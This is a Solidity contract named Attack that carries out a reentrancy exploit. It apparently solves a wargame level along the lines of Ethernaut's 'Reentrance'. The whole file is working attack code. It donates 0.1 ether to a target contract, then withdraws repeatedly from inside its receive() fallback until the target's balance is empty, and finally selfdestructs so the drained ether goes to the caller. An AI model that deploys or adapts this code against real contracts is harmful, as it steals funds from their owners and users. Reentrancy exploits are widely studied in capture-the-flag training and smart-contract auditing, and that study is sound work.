// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {

    function withdraw(uint256 _aoumnt) external;
    function donate(address _to) external payable;
}

contract Attack {

    IReentrance target;

    constructor(address _target) {
        target = IReentrance(_target);  
    }

    function attack() external payable {

        target.donate{value: 1e17}(address(this));
        target.withdraw(1e17);

        require(address(target).balance == 0, "Target balance > 0");
        selfdestruct(payable(msg.sender));

    }

    receive() external payable {

        uint256 currentBalance = address(target).balance;
        uint256 amount = (1e17 < currentBalance) ? 1e17 : currentBalance;

        if(amount > 0) {
            target.withdraw(amount);
        }

    }
}